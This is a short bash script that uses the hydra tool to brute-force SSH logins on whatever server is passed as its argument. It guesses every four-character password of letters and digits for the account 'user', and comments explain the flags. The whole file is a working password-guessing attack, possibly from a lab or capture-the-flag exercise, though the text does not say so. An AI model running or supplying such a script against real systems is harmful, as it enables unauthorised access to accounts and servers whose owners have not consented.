#!/bin/bash


server=$1

#-V means verbose, -x 4:4:aA1 means min is 4 letters, max is 4 letters. 
#List of letters is a-z denoted by a, A-Z denoted by A, 0-9 denoted by 1.
hydra -l user -V -x 4:4:aA1 $server ssh
